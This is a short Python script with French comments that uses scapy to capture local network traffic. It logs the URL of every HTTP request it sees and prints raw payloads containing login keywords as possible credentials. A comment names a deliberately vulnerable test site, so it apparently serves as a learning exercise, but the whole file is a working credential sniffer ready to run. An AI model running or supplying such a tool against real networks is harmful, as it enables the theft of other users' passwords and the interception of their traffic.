from scapy.all import *
from scapy.layers import http

# tester sur http://testphp.vulnweb.com/login.php

keywords = ("login", "username", "user", "uname", "password", "pass", "signin")

# analyse des paquets du réseau local
def process_packet(packet: Packet):
    # détection d'une requête HTTP dans la couche 7
    if packet.haslayer(http.HTTPRequest):
        url = (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode("utf-8")
        print(f"url détectée: {url}")
        # recherche d'identifiants dans les données brutes
        if packet.haslayer(Raw):
            try:
                field_load = packet[Raw].load.decode("utf-8")
                for kw in keywords:
                    if kw in field_load:
                        print(f"possible credentials: {field_load}")
            except UnicodeDecodeError:
                pass

if __name__ == "__main__":
    sniff(store=False, prn=process_packet)